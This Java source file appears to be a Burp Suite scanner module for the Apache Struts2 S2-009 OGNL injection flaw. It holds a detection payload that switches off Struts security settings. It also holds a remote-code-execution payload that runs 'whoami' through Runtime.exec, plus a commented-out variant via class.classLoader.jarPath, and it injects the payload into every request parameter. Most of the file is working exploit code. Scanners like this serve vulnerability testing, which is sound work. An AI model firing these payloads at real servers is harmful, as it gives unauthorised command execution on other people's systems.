package module;

import burp.*;

import java.net.URLEncoder;
import java.util.List;

public class S2_009 extends IModule {
    public S2_009() {
        String format = "abcedfghij=%s&z[(abcedfghij)('meh')]=true";
        poc =
            "(" +
            "#context[\"xwork.MethodAccessor.denyMethodExecution\"]=false," +
            "#_memberAccess[\"allowStaticMethodAccess\"]=true," +
            "#_memberAccess.excludeProperties=@java.util.Collections@EMPTY_SET," +
            "#out=@org.apache.struts2.ServletActionContext@getResponse()," +
            "#out.getWriter().print(\"" + injectMark[0] + "\")," +
            "#out.getWriter().print(\"" + injectMark[1] + "\")," +
            "#out.getWriter().flush()," +
            "#out.getWriter().close()" +
            ")(meh)";
        poc = String.format(format, URLEncoder.encode(poc));

        exp =
            "(" +
            "#context[\"xwork.MethodAccessor.denyMethodExecution\"]=false," +
            "#_memberAccess[\"allowStaticMethodAccess\"]=true," +
            "#_memberAccess.excludeProperties=@java.util.Collections@EMPTY_SET," +
            "#cmd=\"whoami\"," +
            "#ret=@java.lang.Runtime@getRuntime().exec(#cmd)," +
            "#data=new java.io.DataInputStream(#ret.getInputStream())," +
            "#res=new byte[4]," +
            "#data.readFully(#res)," +
            "#echo=new java.lang.String(#res)," +
            "#out=@org.apache.struts2.ServletActionContext@getResponse()," +
            "#out.getWriter().print(#echo)," +
            "#out.getWriter().flush()," +
            "#out.getWriter().close()" +
            ")(meh)";
        exp = String.format(format, URLEncoder.encode(exp));
    }

    //不清楚这个poc为啥可以在无参数传入时也可用
//    public String poc2 = "class.classLoader.jarPath=%28%23context[\"xwork.MethodAccessor.denyMethodExecution\"]%3d+new+java.lang.Boolean%28false%29%2c+%23_memberAccess[\"allowStaticMethodAccess\"]%3dtrue%2c+%23a%3d%40java.lang.Runtime%40getRuntime%28%29.exec%28%27whoami%27%29.getInputStream%28%29%2c%23b%3dnew+java.io.InputStreamReader%28%23a%29%2c%23c%3dnew+java.io.BufferedReader%28%23b%29%2c%23d%3dnew+char[50000]%2c%23c.read%28%23d%29%2c%23sbtest%3d%40org.apache.struts2.ServletActionContext%40getResponse%28%29.getWriter%28%29%2c%23sbtest.println%28%23d%29%2c%23sbtest.close%28%29%29%28meh%29&z[%28class.classLoader.jarPath%29%28%27meh%27%29]";

    @Override
    public IScanIssue start(){
        List<IParameter> parameters = requestInfo.getParameters();
        parameters.add(helpers.buildParameter("class.classLoader.jarPath", "1", (byte) 0));
        for (IParameter parameter: parameters) {
            if (parameter.getType() == (byte) 0 || parameter.getType() == (byte) 1) {
                String toPoc = poc.replace("abcedfghij", parameter.getName());

                String[] params = toPoc.split("&");
                for (String param : params) {
                    String[] tmp = param.split("=", 2);
                    String parameterName = tmp[0];
                    String parameterValue = tmp[1];

                    IParameter newParameter = helpers.buildParameter(parameterName, parameterValue, parameter.getType());
                    request = helpers.updateParameter(request, newParameter);
                }
                if (check()) {
                    this.detail = exp;
                    return creatCustomScanIssue();
                }
            }
        }

        return null;
    }
}
